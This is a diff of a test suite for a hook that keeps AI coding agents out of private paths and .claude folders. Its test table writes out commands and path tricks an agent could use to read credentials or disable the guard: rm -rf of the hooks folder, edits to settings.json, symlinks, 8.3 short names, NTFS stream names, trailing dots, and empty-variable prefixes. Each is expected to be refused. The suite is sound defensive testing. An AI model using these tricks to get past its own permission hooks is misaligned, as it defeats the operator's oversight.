@@ -1,8 +1,18 @@
 // The private-paths guard, held to its record: docs/adr/0196. No agent reads the operator's documents,
 // and a PreToolUse hook refuses any path outside an allow list and fails closed. docs/adr/0201 amends
-// that record, and the L and G cases are held to it.
+// that record, and the L and G cases are held to it. docs/adr/0215 closes the .claude folders, the home
+// folder's and a checkout's, and the H, J, M, Q, T, U, V, W, X, Y and L4 cases are held to it.
 //
 //   node --test src/test/hooks/private-paths-guard.test.mjs
+//
+// docs/adr/0215 section 7: no agent writes into a .claude folder, so a change to the guard is written as
+// a draft in a folder of its own and the operator installs it. VESPERA_GUARD_DRAFT names that folder,
+// which is laid out as .claude is (hooks/private-paths-guard.mjs, hooks/run-private-paths-guard.sh,
+// allowed-paths.txt, settings.json), and every case is then held against the draft's files, each file the
+// draft does not hold being taken from this checkout. P01 and P02 always start this checkout's own. CI
+// sets no such variable, so what is committed is what is held.
+//
+//   VESPERA_GUARD_DRAFT=<folder> node --test src/test/hooks/private-paths-guard.test.mjs
 //
 // Every case goes through the entry point Claude Code calls, .claude/hooks/run-private-paths-guard.sh,
 // with the tool call as JSON on stdin, and claims one exit code: 0 lets the call through, 2 refuses it.
@@ -33,10 +43,18 @@
 //     built/note.txt     and working directories only inside built/target, built/node_modules, built/.git
 //   home/                ${HOME}: .m2/settings.xml (allowed), Documents/x.txt (not),
 //                        .jdks/ (allowed) holding 10,050 empty folders
+//     .claude/           settings.json and ten more names no agent reads or writes; projects/fixture-project/
+//                        with memory/MEMORY.md, a transcript and a tool result; plans/; skills/ and plugins/,
+//                        which are read and not written
 //   outside/doc.txt      under no allowed root
 //   with space/checkout/ a second ${REPO}, whose path holds a space
 //   no-guard/checkout/   the wrapper without private-paths-guard.mjs
 //   main/                a git checkout whose worktree, .claude/worktrees/wt, has no copy of the hook
+//   widened/checkout/    a ${REPO} whose local allow list names ${HOME}/.claude whole, and Documents to read
+//
+// And in checkout/.claude, beside the guard's files: settings.json, settings.local.json, agents/,
+// workflows/, skills/, a-kind-nobody-named.json, and worktrees/wt, a checkout with a .claude of its own.
+// temp/elsewhere/.claude/settings.json is a .claude folder that is no checkout's.
 
 import { after, test } from "node:test";
 import assert from "node:assert/strict";
@@ -71,6 +89,25 @@ const HOOKS = ".claude/hooks";
 const WRAPPER = `${HOOKS}/run-private-paths-guard.sh`;
 const GUARD = `${HOOKS}/private-paths-guard.mjs`;
 const ALLOW_LIST = ".claude/allowed-paths.txt";
+const SETTINGS = ".claude/settings.json";
+
+// The file that is held: the draft's when VESPERA_GUARD_DRAFT names a folder that holds it, else this
+// checkout's. A draft folder that is not there stops the run: a mistyped name must not end in a green
+// run of the files that are already installed. Neither may it lie in a .claude folder, where no agent
+// writes.
+const DRAFT = process.env.VESPERA_GUARD_DRAFT ? fwd(resolve(process.env.VESPERA_GUARD_DRAFT)) : null;
+if (DRAFT && !existsSync(DRAFT)) throw new Error(`VESPERA_GUARD_DRAFT names ${DRAFT}, which is not there`);
+if (DRAFT && DRAFT.toLowerCase().split("/").includes(".claude")) {
+  throw new Error(`VESPERA_GUARD_DRAFT names ${DRAFT}, which lies in a .claude folder; a draft is kept outside every one`);
+}
+// Nor may it hold none of the four files: every case would then be held against what is installed.
+if (DRAFT && ![WRAPPER, GUARD, ALLOW_LIST, SETTINGS].some((file) => existsSync(`${DRAFT}/${file.slice(".claude/".length)}`))) {
+  throw new Error(`VESPERA_GUARD_DRAFT names ${DRAFT}, which holds none of the guard's four files, so nothing of it would be held`);
+}
+const held = (file) => {
+  const drafted = DRAFT ? `${DRAFT}/${file.slice(".claude/".length)}` : null;
+  return drafted && existsSync(drafted) ? drafted : `${repo}/${file}`;
+};
 
 /* ---------- the fixture ---------- */
 
@@ -85,9 +122,9 @@ function put(path, text = "") {
 
 function buildCheckout(dir, { guard = true, wrapper = true } = {}) {
   mkdirSync(`${dir}/${HOOKS}`, { recursive: true });
-  if (wrapper) copyFileSync(`${repo}/${WRAPPER}`, `${dir}/${WRAPPER}`);
-  if (guard) copyFileSync(`${repo}/${GUARD}`, `${dir}/${GUARD}`);
-  copyFileSync(`${repo}/${ALLOW_LIST}`, `${dir}/${ALLOW_LIST}`);
+  if (wrapper) copyFileSync(held(WRAPPER), `${dir}/${WRAPPER}`);
+  if (guard) copyFileSync(held(GUARD), `${dir}/${GUARD}`);
+  copyFileSync(held(ALLOW_LIST), `${dir}/${ALLOW_LIST}`);
   put(`${dir}/README.md`, "# fixture\n");
   put(`${dir}/src/Example.java`, "class Example {}\n");
   return dir;
@@ -287,7 +324,7 @@ function childEnv(overrides) {
 }
 
 // The command string registered in .claude/settings.json, exactly as committed, as a script bash runs.
-const settings = JSON.parse(readFileSync(`${repo}/.claude/settings.json`, "utf8"));
+const settings = JSON.parse(readFileSync(held(SETTINGS), "utf8"));
 const registration = (settings.hooks?.PreToolUse ?? []).find((entry) =>
   (entry.hooks ?? []).some((h) => String(h.command).includes("run-private-paths-guard")),
 );
@@ -295,8 +332,11 @@ const registeredCommand = registration?.hooks.find((h) => String(h.command).incl
 const REGISTERED = `${base}/registered-hook-command.sh`;
 writeFileSync(REGISTERED, (registeredCommand ?? "exit 97") + "\n");
 
-function startGuard({ projectDir = C, script, stdin, env = {} }) {
+// startedIn is the folder the guard's own process is started in, when a case depends on it: a line of an
+// allow list that is no absolute path is read against that folder.
+function startGuard({ projectDir = C, script, stdin, env = {}, startedIn }) {
   return spawnSync(bash, [script ?? `${projectDir}/${WRAPPER}`], {
+    cwd: startedIn,
     input: stdin,
     encoding: "utf8",
     timeout: 120_000,
@@ -679,13 +719,438 @@ const cases = [
   ["G706", "cat of a variable whose word is ${TMPDIR} and a path under the temp folder", "Bash", { command: "cat ${VESPERA_GUARD_HAS_NO_VALUE:-${TMPDIR}/scratch/out.log}" }, ALLOWED],
 ];
 
+/* ---------- the .claude folders, held to docs/adr/0215 ---------- */
+
+// A file in a .claude folder decides how a later session runs: whether the guard is registered at all,
+// what it admits, and what is loaded before it. So the allow list names, of the home folder's .claude,
+// only what an agent has to write there, and nothing in any .claude folder is written by an agent but
+// what lies beneath projects, plans or worktrees. The cases below are added to the table above.
+const HC = `${H}/.claude`;
+const PROJECT = `${HC}/projects/fixture-project`;
+const MEMORY = `${PROJECT}/memory`;
+const WT = `${C}/.claude/worktrees/wt`;
+const leafOf = (p) => p.slice(p.lastIndexOf("/") + 1);
+const folderOf = (p) => p.slice(0, p.lastIndexOf("/"));
+
+// What the allow list no longer names under the home folder's .claude, so that no tool reads it or writes
+// it. The last is a kind of file nobody listed, which is refused because nothing admits it.
+const CLOSED_UNDER_HOME = [
+  ["01", "settings.json", "which can turn every hook off and set a variable for every later session"],
+  ["02", "settings.local.json", "which is read as settings are"],
+  ["03", "CLAUDE.md", "which every session starts by reading"],
+  ["04", "keybindings.json", "which decides what a key does"],
+  ["05", ".credentials.json", "which holds what the session signs in with"],
+  ["06", "hooks/on-start.sh", "a hook's own script"],
+  ["07", "agents/helper.md", "which defines an agent, and may register a hook for it"],
+  ["08", "commands/do.md", "which defines a command"],
+  ["09", "rules/rule.md", "which every session starts by reading"],
+  ["10", "output-styles/style.md", "which replaces part of what a session is told"],
+  ["11", "a-kind-nobody-named/x.json", "a kind of file no list names"],
+];
+// What the allow list names for reading only: Read, Grep and Glob are let through, and a tool that can
+// write, or a shell command, whose text does not say whether it writes, is refused.
+const READ_AND_NOT_WRITTEN_UNDER_HOME = [
+  ["1", "skills/fixture-skill/SKILL.md", "a skill's file"],
+  ["2", "plugins/cache/fixture-plugin/skills/fixture-skill/reference.md", "a file of a plugin's skill"],
+];
+// What no agent writes in a .claude folder that the allow list does admit, each as the folder it is read
+// against and the path beneath it. The files the fixture does not build are written as not there yet.
+const CLOSED_IN_A_CHECKOUT = [
+  ["01", C, ".claude/settings.json", "which registers the guard"],
+  ["02", C, ".claude/settings.local.json", "which is read as settings are"],
+  ["03", C, ".claude/hooks/private-paths-guard.mjs", "the guard"],
+  ["04", C, ".claude/hooks/run-private-paths-guard.sh", "the script that starts the guard"],
+  ["05", C, ".claude/hooks/not-written-yet.mjs", "a file beside the guard that is not there yet"],
+  ["06", C, ".claude/allowed-paths.txt", "the allow list"],
+  ["07", C, ".claude/allowed-paths.local.txt", "this machine's allow list, which is not there yet"],
+  ["08", C, ".claude/agents/analyst.md", "which defines an agent, and may register a hook for it"],
+  ["09", C, ".claude/workflows/flow.mjs", "a script that starts sessions"],
+  ["10", C, ".claude/skills/fixture-skill/SKILL.md", "which defines a skill, and may register a hook for it"],
+  ["11", C, ".claude/a-kind-nobody-named.json", "a kind of file no list names"],
+  ["12", C, ".claude/worktrees/wt/.claude/settings.json", "which registers the guard for a worktree"],
+  ["13", C, ".claude/worktrees/wt/.claude/hooks/private-paths-guard.mjs", "a worktree's copy of the guard"],
+  ["14", C, ".claude/worktrees/wt/.claude/allowed-paths.local.txt", "a worktree's own allow list, which is not there yet"],
+  ["15", T, "elsewhere/.claude/settings.json", "the settings of a .claude folder that is no checkout's"],
+];
+
+for (const [, name] of CLOSED_UNDER_HOME) put(`${HC}/${name}`, "fixture\n");
+for (const [, name] of READ_AND_NOT_WRITTEN_UNDER_HOME) put(`${HC}/${name}`, "fixture\n");
+put(`${MEMORY}/MEMORY.md`, "fixture\n");
+put(`${PROJECT}/fixture-session.jsonl`, "{}\n");
+put(`${PROJECT}/fixture-session/tool-results/result.txt`, "fixture\n");
+put(`${HC}/plans/fixture-plan.md`, "fixture\n");
+for (const file of ["settings.json", "settings.local.json", "agents/analyst.md", "workflows/flow.mjs", "skills/fixture-skill/SKILL.md", "a-kind-nobody-named.json"]) {
+  put(`${C}/.claude/${file}`, "fixture\n");
+}
+for (const file of ["README.md", "src/Example.java", ".claude/settings.json", ".claude/hooks/private-paths-guard.mjs"]) {
+  put(`${WT}/${file}`, "fixture\n");
+}
+put(`${T}/elsewhere/.claude/settings.json`, "fixture\n");
+
+// Links that lead to a closed place from a place that is not closed: from the temp folder, from the
+// memory directory, and from beneath worktrees. Kept apart from the links above, so that every case
+// written before these is started wherever it was.
+let linkedToClaude = linkable;
+if (linkedToClaude) {
+  try {
+    for (const [link, target] of [
+      [`${LINKS}/to-home-claude`, HC],
+      [`${LINKS}/to-checkout-claude`, `${C}/.claude`],
+      [`${LINKS}/to-hooks`, `${C}/.claude/hooks`],
+      [`${MEMORY}/to-home-claude`, HC],
+      [`${C}/.claude/worktrees/to-checkout-claude`, `${C}/.claude`],
+      [`${WT}/to-checkout-claude`, `${C}/.claude`],
+    ]) {
+      symlinkSync(native(target), native(link), windows ? "junction" : "dir");
+    }
+  } catch {
+    linkedToClaude = false;
+  }
+}
+if (
+  !existsSync(`${LINKS}/to-home-claude/settings.json`) ||
+  !existsSync(`${LINKS}/to-checkout-claude/settings.json`) ||
+  !existsSync(`${LINKS}/to-hooks/private-paths-guard.mjs`) ||
+  !existsSync(`${MEMORY}/to-home-claude/settings.json`) ||
+  !existsSync(`${C}/.claude/worktrees/to-checkout-claude/settings.json`) ||
+  !existsSync(`${WT}/to-checkout-claude/settings.json`)
+) {
+  linkedToClaude = false;
+}
+
+// The 8.3 name Windows gives the checkout's .claude, such as CLAUDE~1, where the volume gives one. It is
+// asked of the file system and not guessed, and where there is none the two cases that need it are not
+// started.
+let SHORT_NAME_OF_CLAUDE = null;
+if (windows) {
+  try {
+    const answered = execFileSync(
+      "powershell",
+      ["-NoProfile", "-Command", `(New-Object -ComObject Scripting.FileSystemObject).GetFolder('${C}/.claude').ShortName`],
+      { encoding: "utf8", timeout: 60_000, windowsHide: true },
+    ).trim();
+    if (answered && answered.toLowerCase() !== ".claude" && existsSync(`${C}/${answered}/settings.json`)) SHORT_NAME_OF_CLAUDE = answered;
+  } catch {
+    // no 8.3 name to be had
+  }
+}
+const NO_SHORT_NAME = "this volume gives the fixture's .claude no 8.3 name";
+
+/* H. Under the home folder's .claude, what the allow list does not name is refused to every tool, for
+   reading as for writing, by ~, $HOME, ${HOME} and a relative path that climbs out of the memory
+   directory. One path through each tool that can name it. */
+for (const [nn, name, whatItIs] of CLOSED_UNDER_HOME) {
+  const p = `${HC}/${name}`;
+  const of = `~/.claude/${name}, ${whatItIs}`;
+  cases.push(
+    [`H${nn}01`, `Read of ${of}`, "Read", { file_path: p }, REFUSED],
+    [`H${nn}02`, `Edit of ${of}`, "Edit", { file_path: p, old_string: "a", new_string: "b" }, REFUSED],
+    [`H${nn}03`, `Write of ${of}`, "Write", { file_path: p, content: "x" }, REFUSED],
+    [`H${nn}04`, `NotebookEdit of ${of}`, "NotebookEdit", { notebook_path: p, new_source: "x" }, REFUSED],
+    [`H${nn}05`, `Grep whose path is ${of}`, "Grep", { pattern: "x", path: p }, REFUSED],
+    [`H${nn}06`, `Glob whose pattern names, beneath its path, ${of}`, "Glob", { pattern: leafOf(p), path: folderOf(p) }, REFUSED],
+    [`H${nn}07`, `cat, by ~, of ${of}`, "Bash", { command: `cat ~/.claude/${name}` }, REFUSED],
+    [`H${nn}08`, `a redirect, by $HOME, into ${of}`, "Bash", { command: `echo x >> $HOME/.claude/${name}` }, REFUSED],
+    [`H${nn}09`, `cat, by \${HOME}, of ${of}`, "Bash", { command: `cat \${HOME}/.claude/${name}` }, REFUSED],
+    [`H${nn}10`, `cat, by a relative path that climbs out of the memory directory, of ${of}`, "Bash", { command: `cat ../../../${name}` }, REFUSED, { cwd: MEMORY }],
+    [`H${nn}11`, `Set-Content, by $env:USERPROFILE, of ${of}`, "PowerShell", { command: `Set-Content $env:USERPROFILE\\.claude\\${back(name)} x` }, REFUSED, { windows: ONLY_WINDOWS.powerShell }],
+  );
+}
+
+/* J. In a .claude folder the allow list admits, a checkout's, a worktree's or any other, nothing is
+   written by an agent: Edit, Write and NotebookEdit are refused, and so is a shell command that names
+   the path, since its text does not say whether it writes. Read, Grep and Glob are let through. */
+for (const [nn, against, rel, whatItIs] of CLOSED_IN_A_CHECKOUT) {
+  const p = `${against}/${rel}`;
+  const of = `${rel}, ${whatItIs}`;
+  cases.push(
+    [`J${nn}01`, `Edit of ${of}`, "Edit", { file_path: p, old_string: "a", new_string: "b" }, REFUSED],
+    [`J${nn}02`, `Write of ${of}`, "Write", { file_path: p, content: "x" }, REFUSED],
+    [`J${nn}03`, `NotebookEdit of ${of}`, "NotebookEdit", { notebook_path: p, new_source: "x" }, REFUSED],
+    [`J${nn}04`, `Write, by a relative path, of ${of}`, "Write", { file_path: rel, content: "x" }, REFUSED, { cwd: against }],
+    [`J${nn}05`, `cat, by a relative path, of ${of}`, "Bash", { command: `cat ${rel}` }, REFUSED, { cwd: against }],
+    [`J${nn}06`, `cd to its folder, then rm by its name, of ${of}`, "Bash", { command: `cd ${folderOf(rel)} && rm ${leafOf(rel)}` }, REFUSED, { cwd: against }],
+    [`J${nn}07`, `cat, by its absolute path, of ${of}`, "Bash", { command: `cat ${p}` }, REFUSED, { windows: ONLY_WINDOWS.shellAbsolute }],
+    [`J${nn}08`, `Set-Content, by a relative path written with backslashes, of ${of}`, "PowerShell", { command: `Set-Content ${back(rel)} x` }, REFUSED, { cwd: against, windows: ONLY_WINDOWS.powerShell }],
+    [`J${nn}09`, `Read of ${of}`, "Read", { file_path: p }, ALLOWED],
+    [`J${nn}10`, `Grep whose path is ${of}`, "Grep", { pattern: "x", path: p }, ALLOWED],
+    [`J${nn}11`, `Glob whose pattern names, beneath its path, ${of}`, "Glob", { pattern: leafOf(rel), path: `${against}/${folderOf(rel)}` }, ALLOWED],
+  );
+}
+
+/* M2. What the allow list names for reading only. */
+for (const [n, name, whatItIs] of READ_AND_NOT_WRITTEN_UNDER_HOME) {
+  const p = `${HC}/${name}`;
+  const of = `~/.claude/${name}, ${whatItIs}`;
+  cases.push(
+    [`M2${n}1`, `Read of ${of}`, "Read", { file_path: p }, ALLOWED],
+    [`M2${n}2`, `Grep whose path is the folder of ${of}`, "Grep", { pattern: "x", path: folderOf(p) }, ALLOWED],
+    [`M2${n}3`, `Glob whose pattern names, beneath its path, ${of}`, "Glob", { pattern: leafOf(p), path: folderOf(p) }, ALLOWED],
+    [`M2${n}4`, `Write of ${of}`, "Write", { file_path: p, content: "x" }, REFUSED],
+    [`M2${n}5`, `Edit of ${of}`, "Edit", { file_path: p, old_string: "a", new_string: "b" }, REFUSED],
+    [`M2${n}6`, `NotebookEdit of ${of}`, "NotebookEdit", { notebook_path: p, new_source: "x" }, REFUSED],
+    [`M2${n}7`, `cat, by ~, of ${of}`, "Bash", { command: `cat ~/.claude/${name}` }, REFUSED],
+    [`M2${n}8`, `a redirect, by $HOME, into ${of}`, "Bash", { command: `echo x >> $HOME/.claude/${name}` }, REFUSED],
+    [`M2${n}9`, `Get-Content, by $env:USERPROFILE, of ${of}`, "PowerShell", { command: `Get-Content $env:USERPROFILE\\.claude\\${back(name)}` }, REFUSED, { windows: ONLY_WINDOWS.powerShell }],
+  );
+}
+
+cases.push(
+  /* M1. What stays writable under the home folder's .claude: the memory directory, a session's own
+     transcript and tool results, which are all beneath projects, and a plan. */
+  ["M101", "Write of a new file in the memory directory", "Write", { file_path: `${MEMORY}/a-new-note.md`, content: "x" }, ALLOWED],
+  ["M102", "Edit of MEMORY.md in the memory directory", "Edit", { file_path: `${MEMORY}/MEMORY.md`, old_string: "a", new_string: "b" }, ALLOWED],
+  ["M103", "Read of MEMORY.md in the memory directory", "Read", { file_path: `${MEMORY}/MEMORY.md` }, ALLOWED],
+  ["M104", "Grep whose path is the memory directory", "Grep", { pattern: "x", path: MEMORY }, ALLOWED],
+  ["M105", "ls, by ~, of the memory directory", "Bash", { command: "ls ~/.claude/projects/fixture-project/memory" }, ALLOWED],
+  ["M106", "a redirect, by $HOME, into a file of the memory directory", "Bash", { command: "echo x >> $HOME/.claude/projects/fixture-project/memory/MEMORY.md" }, ALLOWED],
+  ["M107", "Get-Content, by $env:USERPROFILE, of MEMORY.md in the memory directory", "PowerShell", { command: String.raw`Get-Content $env:USERPROFILE\.claude\projects\fixture-project\memory\MEMORY.md` }, ALLOWED, { windows: ONLY_WINDOWS.powerShell }],
+  ["M108", "Write of a session's transcript", "Write", { file_path: `${PROJECT}/fixture-session.jsonl`, content: "x" }, ALLOWED],
+  ["M109", "Read of a tool result kept beside a session's transcript", "Read", { file_path: `${PROJECT}/fixture-session/tool-results/result.txt` }, ALLOWED],
+  ["M110", "Write of MEMORY.md for a project whose folder is not there yet", "Write", { file_path: `${HC}/projects/not-made-yet/memory/MEMORY.md`, content: "x" }, ALLOWED],
+  ["M111", "Write of a new plan", "Write", { file_path: `${HC}/plans/a-new-plan.md`, content: "x" }, ALLOWED],
+  ["M112", "Read of a plan", "Read", { file_path: `${HC}/plans/fixture-plan.md` }, ALLOWED],
+  ["M113", "a command naming no path, with the memory directory as the current directory", "Bash", { command: "ls" }, ALLOWED, { cwd: MEMORY }],
+
+  /* Q1. A .claude folder itself, and a folder in it that is closed, is refused to a shell command, as
+     what it names and as its current directory. A search reads, and is let through. The home folder's
+     .claude is outside the allow list, and is refused to every tool. */
+  ["Q101", "ls of the checkout's .claude", "Bash", { command: "ls .claude" }, REFUSED],
+  ["Q102", "rm -rf of the folder the guard is in", "Bash", { command: "rm -rf .claude/hooks" }, REFUSED],
+  ["Q103", "Remove-Item of the checkout's .claude", "PowerShell", { command: "Remove-Item .claude -Recurse" }, REFUSED],
+  ["Q104", "a command naming no path, with the checkout's .claude as the current directory", "Bash", { command: "ls" }, REFUSED, { cwd: `${C}/.claude` }],
+  ["Q105", "a command naming no path, with the folder the guard is in as the current directory", "Bash", { command: "ls" }, REFUSED, { cwd: `${C}/.claude/hooks` }],
+  ["Q106", "Grep with no path, with the folder the guard is in as the current directory", "Grep", { pattern: "x" }, ALLOWED, { cwd: `${C}/.claude/hooks` }],
+  ["Q107", "git add of the guard by its name", "Bash", { command: "git add .claude/hooks/private-paths-guard.mjs" }, REFUSED],
+  ["Q108", "git commit with a quoted sentence that names the allow list", "Bash", { command: 'git commit -m "The allow list is .claude/allowed-paths.txt, and no agent writes it."' }, REFUSED],
+  ["Q109", "cat of a worktree's settings by a relative path, with the worktree as the current directory", "Bash", { command: "cat .claude/settings.json" }, REFUSED, { cwd: WT }],
+  ["Q110", "ls of ../.. from a worktree, which is the .claude folder the worktree is kept in", "Bash", { command: "ls ../.." }, REFUSED, { cwd: WT }],
+  ["Q111", "ls, by ~, of the home folder's .claude", "Bash", { command: "ls ~/.claude" }, REFUSED],
+  ["Q112", "ls of ~/.claude/projects/.., which is the home folder's .claude", "Bash", { command: "ls ~/.claude/projects/.." }, REFUSED],
+  ["Q113", "cd to ~/.claude/projects, then cat of a relative path that climbs to the settings beside it", "Bash", { command: "cd ~/.claude/projects && cat ../settings.json" }, REFUSED, { cwd: `${C}/src` }],
+  ["Q114", "Grep whose path is the home folder's .claude", "Grep", { pattern: "x", path: HC }, REFUSED],
+  ["Q115", "Glob with an absolute pattern over the home folder's .claude", "Glob", { pattern: `${HC}/**/*.json` }, REFUSED],
+
+  /* Q2. A worktree is a checkout of its own beneath worktrees, and stays writable outside its .claude. */
+  ["Q201", "Write of a source file in a worktree", "Write", { file_path: `${WT}/src/Example.java`, content: "x" }, ALLOWED],
+  ["Q202", "Edit of a worktree's README.md", "Edit", { file_path: `${WT}/README.md`, old_string: "a", new_string: "b" }, ALLOWED],
+  ["Q203", "cat of a worktree's README.md by a relative path from the checkout", "Bash", { command: "cat .claude/worktrees/wt/README.md" }, ALLOWED],
+  ["Q204", "git -C naming a worktree", "Bash", { command: "git -C .claude/worktrees/wt status" }, ALLOWED],
+  ["Q205", "cat of a worktree's README.md, with the worktree as the current directory", "Bash", { command: "cat README.md" }, ALLOWED, { cwd: WT }],
+  ["Q206", "Write of a file in a worktree that is not there yet", "Write", { file_path: `${C}/.claude/worktrees/not-made-yet/README.md`, content: "x" }, ALLOWED],
+  ["Q207", "ls of the folder the worktrees are kept in", "Bash", { command: "ls .claude/worktrees" }, ALLOWED],
+  ["Q208", "Write of a file in a worktree, with worktrees written in another case", "Write", { file_path: `${C}/.claude/Worktrees/wt/README.md`, content: "x" }, ALLOWED],
+
+  /* Q3. Other spellings of a closed name. Measured on Windows: PowerShell opens .claude.\settings.json
+     and .claude\settings.json. as .claude\settings.json, and a stream name leads to the file it is a
+     stream of. A name is compared with its case folded, and on Windows with the dots that end it taken
+     off; whatever is still not one of the three open names is closed. */
+  ["Q301", "Write of the checkout's settings with .claude and the file's name in another case", "Write", { file_path: `${C}/.CLAUDE/Settings.JSON`, content: "x" }, REFUSED],
+  ["Q302", "Set-Content of the checkout's settings with a dot after .claude", "PowerShell", { command: String.raw`Set-Content .claude.\settings.json x` }, REFUSED, { windows: ONLY_WINDOWS.powerShell }],
+  ["Q303", "Write of the checkout's settings with a dot after .claude", "Write", { file_path: `${C}/.claude./settings.json`, content: "x" }, REFUSED, { windows: ONLY_WINDOWS.drive }],
+  ["Q304", "Set-Content of the checkout's settings with a dot after the file's name", "PowerShell", { command: String.raw`Set-Content .claude\settings.json. x` }, REFUSED, { windows: ONLY_WINDOWS.powerShell }],
+  ["Q305", "Write of the checkout's settings by their data stream name", "Write", { file_path: `${C}/.claude/settings.json::$DATA`, content: "x" }, REFUSED, { windows: ONLY_WINDOWS.drive }],
+  ["Q306", "Write of the checkout's settings through the stream name of .claude itself", "Write", { file_path: `${C}/.claude::$INDEX_ALLOCATION/settings.json`, content: "x" }, REFUSED, { windows: ONLY_WINDOWS.drive }],
+
+  /* L4. A link from a place that is not closed to one that is refuses, as docs/adr/0201 has it for the
+     allowed roots; and one that leads to a place that stays writable is let through. */
+  ["L401", "Read through a link under the temp folder that leads to the home folder's .claude", "Read", { file_path: `${LINKS}/to-home-claude/settings.json` }, REFUSED, { needsLinksToClaude: true }],
+  ["L402", "Write through such a link", "Write", { file_path: `${LINKS}/to-home-claude/settings.json`, content: "x" }, REFUSED, { needsLinksToClaude: true }],
+  ["L403", "cat of a relative path through such a link", "Bash", { command: "cat links/to-home-claude/settings.json" }, REFUSED, { cwd: T, needsLinksToClaude: true }],
+  ["L404", "Write through a link in the memory directory that leads to the home folder's .claude", "Write", { file_path: `${MEMORY}/to-home-claude/settings.json`, content: "x" }, REFUSED, { needsLinksToClaude: true }],
+  ["L405", "Write into the memory directory through a link under the temp folder", "Write", { file_path: `${LINKS}/to-home-claude/projects/fixture-project/memory/a-new-note.md`, content: "x" }, ALLOWED, { needsLinksToClaude: true }],
+  ["L406", "Write through a link under the temp folder that leads to the checkout's .claude", "Write", { file_path: `${LINKS}/to-checkout-claude/settings.json`, content: "x" }, REFUSED, { needsLinksToClaude: true }],
+  ["L407", "Edit of the guard through a link under the temp folder that leads to the folder it is in", "Edit", { file_path: `${LINKS}/to-hooks/private-paths-guard.mjs`, old_string: "a", new_string: "b" }, REFUSED, { needsLinksToClaude: true }],
+  ["L408", "cat of the guard by a relative path through such a link", "Bash", { command: "cat links/to-hooks/private-paths-guard.mjs" }, REFUSED, { cwd: T, needsLinksToClaude: true }],
+  ["L409", "Read of the guard through such a link", "Read", { file_path: `${LINKS}/to-hooks/private-paths-guard.mjs` }, ALLOWED, { needsLinksToClaude: true }],
+  ["L410", "Write through a link beneath worktrees that leads to the checkout's .claude", "Write", { file_path: `${C}/.claude/worktrees/to-checkout-claude/settings.json`, content: "x" }, REFUSED, { needsLinksToClaude: true }],
+  ["L411", "cd through a link that leads to the checkout's .claude, then rm of a name in it", "Bash", { command: "cd links/to-checkout-claude && rm settings.json" }, REFUSED, { cwd: T, needsLinksToClaude: true }],
+  ["L412", "Write of a path that climbs with .. out of a link to the folder the guard is in, to the settings beside that folder", "Write", { file_path: `${LINKS}/to-hooks/../settings.json`, content: "x" }, REFUSED, { needsLinksToClaude: true }],
+  ["L413", "Write through a link inside a worktree that leads to the checkout's .claude", "Write", { file_path: `${WT}/to-checkout-claude/settings.json`, content: "x" }, REFUSED, { needsLinksToClaude: true }],
+  ["L414", "cat of a relative path through such a link, with the worktree as the current directory", "Bash", { command: "cat to-checkout-claude/settings.json" }, REFUSED, { cwd: WT, needsLinksToClaude: true }],
+
+  /* M1, continued. projects and plans are open beneath every .claude folder, a checkout's too: the guard
+     does not ask which folder it is in, and Claude Code is documented to read nothing from either there. */
+  ["M114", "Write beneath projects in the checkout's .claude", "Write", { file_path: `${C}/.claude/projects/a-note.md`, content: "x" }, ALLOWED],
+  ["M115", "Write beneath plans in the checkout's .claude", "Write", { file_path: `${C}/.claude/plans/a-plan.md`, content: "x" }, ALLOWED],
+  ["M116", "ls of plans in the checkout's .claude", "Bash", { command: "ls .claude/plans" }, ALLOWED],
+
+  /* Q1, continued. */
+  ["Q116", "Write by a plain name, with the checkout's .claude as the current directory", "Write", { file_path: "settings.local.json", content: "x" }, REFUSED, { cwd: `${C}/.claude` }],
+  ["Q117", "ls of the folder a worktree's copy of the guard is in", "Bash", { command: "ls .claude/worktrees/wt/.claude/hooks" }, REFUSED],
+  ["Q118", "ls of the checkout's .claude by its plain name in another case", "Bash", { command: "ls .CLAUDE" }, REFUSED],
+
+  /* Q3, continued. A space after a name, which the guard takes off as it takes off a dot: PowerShell was
+     seen to open .claude\settings.json with a space after it, and not to find .claude with one. And the
+     8.3 name of .claude, which leads to it whether or not the file beneath it is there yet. */
+  ["Q307", "Write of the checkout's settings with a space after .claude", "Write", { file_path: `${C}/.claude /settings.json`, content: "x" }, REFUSED, { windows: ONLY_WINDOWS.drive }],
+  ["Q308", "Set-Content of the checkout's settings, quoted, with a space after .claude", "PowerShell", { command: String.raw`Set-Content '.claude \settings.json' x` }, REFUSED, { windows: ONLY_WINDOWS.powerShell }],
+  ["Q309", "Set-Content of the checkout's settings, quoted, with a space after the file's name", "PowerShell", { command: String.raw`Set-Content '.claude\settings.json ' x` }, REFUSED, { windows: ONLY_WINDOWS.powerShell }],
+  ["Q310", "Write of the checkout's settings by the 8.3 name of .claude", "Write", { file_path: `${C}/${SHORT_NAME_OF_CLAUDE}/settings.json`, content: "x" }, REFUSED, { needsShortName: true }],
+  ["Q311", "Write of a file that is not there yet beside the guard, by the 8.3 name of .claude", "Write", { file_path: `${C}/${SHORT_NAME_OF_CLAUDE}/hooks/not-written-yet.mjs`, content: "x" }, REFUSED, { needsShortName: true }],
+  ["Q312", "cat of the checkout's settings by a relative path through the 8.3 name of .claude", "Bash", { command: `cat ${SHORT_NAME_OF_CLAUDE}/settings.json` }, REFUSED, { needsShortName: true }],
+
+  /* T1. A shell command is refused when a token of its text holds a name that ends in .claude and is the
+     last of the token or is followed by any name but projects, plans or worktrees, whatever heads the
+     token and whether or not the guard reads the token as a path. So the forms docs/adr/0196 section 5
+     leaves unread do not carry a closed path: two variables in a row, a variable with no value, an
+     option with its value attached, a path from the root with no drive, and a variable as cmd writes it. */
+  ["T101", "cat of the settings after two variables in a row that have no value", "Bash", { command: "cat $VESPERA_GUARD_HAS_NO_VALUE$VESPERA_GUARD_NOR_THIS/.claude/settings.json" }, REFUSED],
+  ["T102", "cat of the settings after $HOME and a second variable", "Bash", { command: "cat $HOME$VESPERA_GUARD_HAS_NO_VALUE/.claude/settings.json" }, REFUSED],
+  ["T103", "cat of the settings after one variable that has no value", "Bash", { command: "cat $VESPERA_GUARD_HAS_NO_VALUE/.claude/settings.json" }, REFUSED],
+  ["T104", "a redirect into the guard after a variable in braces that has no value", "Bash", { command: "echo x >> ${VESPERA_GUARD_HAS_NO_VALUE}/.claude/hooks/private-paths-guard.mjs" }, REFUSED],
+  ["T105", "sort with the settings attached to its -o option", "Bash", { command: "sort -o.claude/settings.json README.md" }, REFUSED],
+  ["T106", "Set-Content with the settings attached to its -Path option by a colon", "PowerShell", { command: "Set-Content -Path:.claude/settings.json x" }, REFUSED],
